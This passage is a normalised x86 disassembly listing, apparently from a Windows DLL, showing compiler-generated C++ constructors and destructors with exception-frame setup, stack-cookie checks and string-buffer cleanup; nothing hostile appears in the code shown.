call j_sub_1003f3e3#2
add esp 0x4
sub_1001f3c0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x30 ]
mov ecx esi
call sub_1001f3f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001f3f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x30 ]
call sub_1001f320
mov eax [ esi + 0x40 ]
lea edx [ esi + 0x5c ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x3c ]
mov [ esi + 0x38 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x3c ] r--data
mov [ esi + 0x30 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1001f4b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f667
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp + 0x18 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x38 ] r--data
mov [ esi + 0x24 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x2c ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x3
push ecx
push 0x8
push [ ebp + 0xc ]
lea ecx [ esi + 0x38 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x7
mov eax [ ebp + 0x10 ]
mov [ esi + 0x1c ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x2c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x2c ] 0x7
mov [ ebp + 0x18 ] ax
mov eax esi
mov [ ebp + 0x28 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x28
push [ ebp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001f600
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f69b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x28 ] eax
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x28 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0xc ] 0x8
jb r-xdata
xor eax eax
mov [ esi - 0xc ] 0x7
mov [ esi - 0x10 ] 0x0
mov [ esi - 0x20 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001f6a0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x24 ]
mov ecx esi
call sub_1001f6d0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001f6d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x24 ]
call sub_1001f600
mov eax [ esi + 0x38 ]
lea edx [ esi + 0x54 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x30 ]
mov [ esi + 0x2c ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x30 ] r--data
mov [ esi + 0x24 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1001f790
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f667
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp + 0x18 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x38 ] r--data
mov [ esi + 0x24 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x2c ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x3
push ecx
push 0x9
push [ ebp + 0xc ]
lea ecx [ esi + 0x38 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x7
mov eax [ ebp + 0x10 ]
mov [ esi + 0x1c ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x2c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x2c ] 0x7
mov [ ebp + 0x18 ] ax
mov eax esi
mov [ ebp + 0x28 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x28
push [ ebp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001f8e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f69b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x28 ] eax
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x28 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0xc ] 0x8
jb r-xdata
xor eax eax
mov [ esi - 0xc ] 0x7
mov [ esi - 0x10 ] 0x0
mov [ esi - 0x20 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001f980
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x24 ]
mov ecx esi
call sub_1001f9b0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001f9b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x24 ]
call sub_1001f8e0
mov eax [ esi + 0x38 ]
lea edx [ esi + 0x54 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x30 ]
mov [ esi + 0x2c ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x30 ] r--data
mov [ esi + 0x24 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1001fa70
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f174
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x14 ] r--data
mov [ esi + 0x18 ] r--data
mov [ esi + 0x8 ] r--data
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x10 ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x2
push ecx
push 0xe
push [ ebp + 0xc ]
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
mov [ ebp - 0x10 ] 0x7
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + esi - 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_1001fb60
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx esi
call sub_1001fb90
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001fb90
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f0fb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi ]
lea edx [ esi + 0x34 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x14 ]
mov [ esi + 0x10 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x14 ] r--data
mov [ esi + 0x8 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_1001fc70
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f437
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x8 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
lea eax [ ebp + 0x18 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x38 ] r--data
mov [ esi + 0x24 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x2c ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x3
push ecx
push 0xf
push [ ebp + 0xc ]
lea ecx [ esi + 0x38 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x7
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x2c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x2c ] 0x7
mov [ ebp + 0x18 ] ax
mov eax esi
mov [ ebp + 0x28 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x28
push [ ebp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001fdc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f22b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x28 ] eax
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x28 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x8 ] 0x8
jb r-xdata
xor eax eax
mov [ esi - 0x8 ] 0x7
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001fe60
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x24 ]
mov ecx esi
call sub_1001fe90
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001fe90
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x24 ]
call sub_1001fdc0
mov eax [ esi + 0x38 ]
lea edx [ esi + 0x54 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x30 ]
mov [ esi + 0x2c ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x30 ] r--data
mov [ esi + 0x24 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1001ff50
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f9e3
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x3
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x6c ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x74 ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x8
lea eax [ esi + 0x1c ]
xor edx edx
mov [ eax + 0x14 ] 0x7
mov [ eax + 0x10 ] 0x0
mov [ eax ] dx
mov [ ebp - 0x4 ] 0x9
lea ebx [ esi + 0x34 ]
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] edx
mov [ ebx ] dx
mov [ ebp - 0x4 ] 0xa
lea edi [ esi + 0x4c ]
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] edx
mov [ edi ] dx
mov [ ebp - 0x4 ] 0xb
lea edx [ ebp + 0x18 ]
cmp ecx edx
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x78 ] r--data
mov [ esi + 0x80 ] r--data
mov [ esi + 0x6c ] r--data
mov [ ebp - 0x4 ] 0x4
lea ecx [ esi + 0x74 ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x6
push ecx
push 0x10
push [ ebp + 0xc ]
lea ecx [ esi + 0x80 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x10 ] 0x7
lea ecx [ ebp + 0x30 ]
cmp eax ecx
je r-xdata
push 0xffffffff
push 0x0
mov eax edx
push eax
call sub_10003a20
lea eax [ esi + 0x1c ]
lea eax [ ebp + 0x48 ]
cmp ebx eax
je r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx eax
call sub_10003a20
lea eax [ ebp + 0x60 ]
cmp edi eax
je r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx ebx
call sub_10003a20
mov eax [ ebp + 0x10 ]
mov [ esi + 0x64 ] eax
mov [ ebp - 0x4 ] 0x2
cmp [ ebp + 0x2c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx edi
call sub_10003a20
xor eax eax
mov [ ebp + 0x2c ] 0x7
mov [ ebp + 0x28 ] 0x0
mov [ ebp + 0x18 ] ax
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x44 ] 0x8
jb r-xdata
push [ ebp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp + 0x44 ] 0x7
mov [ ebp + 0x40 ] 0x0
mov [ ebp + 0x30 ] ax
mov [ ebp - 0x4 ] al
cmp [ ebp + 0x5c ] 0x8
jb r-xdata
push [ ebp + 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp + 0x5c ] 0x7
mov [ ebp + 0x58 ] 0x0
mov [ ebp + 0x48 ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x74 ] 0x8
jb r-xdata
push [ ebp + 0x48 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp + 0x74 ] 0x7
mov [ ebp + 0x60 ] ax
mov eax esi
mov [ ebp + 0x70 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x70
push [ ebp + 0x60 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100201b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004fa2c
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x6c ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x6c ] r--data
mov eax [ esi - 0x6c ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x6c ] r--data
mov eax [ esi - 0x6c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x6c ]
mov [ ecx + esi - 0x70 ] eax
mov eax [ esi - 0x6c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x74 ]
mov [ ecx + esi - 0x70 ] eax
mov [ ebp - 0x4 ] 0x2
cmp [ esi - 0xc ] 0x8
jb r-xdata
mov [ esi - 0xc ] 0x7
xor eax eax
mov [ esi - 0x10 ] 0x0
mov [ esi - 0x20 ] ax
mov [ ebp - 0x4 ] 0x1
cmp [ esi - 0x24 ] 0x8
jb r-xdata
push [ esi - 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esi - 0x24 ] 0x7
mov [ esi - 0x28 ] 0x0
mov [ esi - 0x38 ] ax
mov [ ebp - 0x4 ] al
cmp [ esi - 0x3c ] 0x8
jb r-xdata
push [ esi - 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi - 0x3c ] 0x7
xor eax eax
mov [ esi - 0x40 ] 0x0
mov [ esi - 0x50 ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x54 ] 0x8
jb r-xdata
push [ esi - 0x50 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esi - 0x54 ] 0x7
mov [ esi - 0x58 ] 0x0
mov [ esi - 0x68 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x68 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100202d0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x6c ]
mov ecx esi
call sub_10020300
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10020300
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x6c ]
call sub_100201b0
mov eax [ esi + 0x80 ]
lea edx [ esi + 0x9c ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
